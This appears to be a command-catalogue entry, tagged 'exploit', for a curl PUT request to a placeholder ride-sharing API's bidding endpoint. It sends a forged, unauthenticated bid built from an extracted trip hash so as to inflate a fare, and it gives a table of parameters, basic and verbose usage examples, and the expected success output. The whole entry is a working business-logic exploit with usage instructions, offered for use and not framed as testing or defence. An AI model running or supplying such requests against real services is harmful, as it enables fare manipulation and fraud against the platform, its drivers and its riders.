---
data: >-
  curl -X PUT "https://api.example.com/v1/bidding" -H "Content-Type:
  application/json" -d '{"hash": "EXTRACTED_HASH", "bid_amount": 500}' -H
  "Accept: application/json"
tags:
  - api
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:34.934Z'
id: 1c5b0e2a-a6fb-4e23-aa16-262a4e5ea3e0
verified: false
validated: true
submitted: true
---
# curl-put-forged-bid

## Command

```bash
curl -X PUT "https://api.example.com/v1/bidding" -H "Content-Type: application/json" -d '{"hash": "EXTRACTED_HASH", "bid_amount": 500}' -H "Accept: application/json"
```

## Description

This command sends an unauthenticated PUT request to submit a forged bid using a trip hash, inflating the fare in the bidding endpoint of a ride-sharing API. It exploits business logic flaws for manipulation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PUT` | Specifies the HTTP method | Yes |
| `-d '{"hash": "EXTRACTED_HASH", "bid_amount": 500}'` | JSON payload with hash and inflated amount | Yes |
| `-H "Content-Type: application/json"` | Sets request body type | Yes |
| `-H "Accept: application/json"` | Requests JSON response | Yes |

## Examples

### Basic Usage

```bash
curl -X PUT "https://api.example.com/v1/bidding" -H "Content-Type: application/json" -d '{"hash": "abc123", "bid_amount": 500}' -H "Accept: application/json"
```

### Advanced Usage

```bash
curl -X PUT "https://api.example.com/v1/bidding" -H "Content-Type: application/json" -d '{"hash": "abc123", "bid_amount": 500}' -H "Accept: application/json" -v
```

## Expected Output

Success JSON like {"status": "bid_updated", "new_amount": 500}. HTTP 200 confirms submission; check driver interface for fare change.

## Related

- [[Related Procedure]]
